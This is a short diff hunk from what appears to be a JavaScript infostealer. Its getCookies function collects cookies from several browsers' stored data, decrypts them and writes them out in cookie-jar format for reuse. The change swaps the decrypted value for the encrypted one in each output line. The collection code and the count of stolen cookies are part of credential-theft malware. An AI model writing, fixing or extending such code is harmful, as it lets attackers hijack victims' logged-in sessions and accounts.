@@ -3718,7 +3718,7 @@ async function getCookies() {
                     }
 
                     cookiesData[`${browserFolder}_${browserPath[i][1]}`].push(
-                        `${row.host_key}	TRUE	/	FALSE	2597573456	${row.name}	${decrypted} \n\n`
+                        `${row.host_key}	TRUE	/	FALSE	2597573456	${row.name}	${encryptedData} \n\n`
                     );
 
                     count.cookies++;
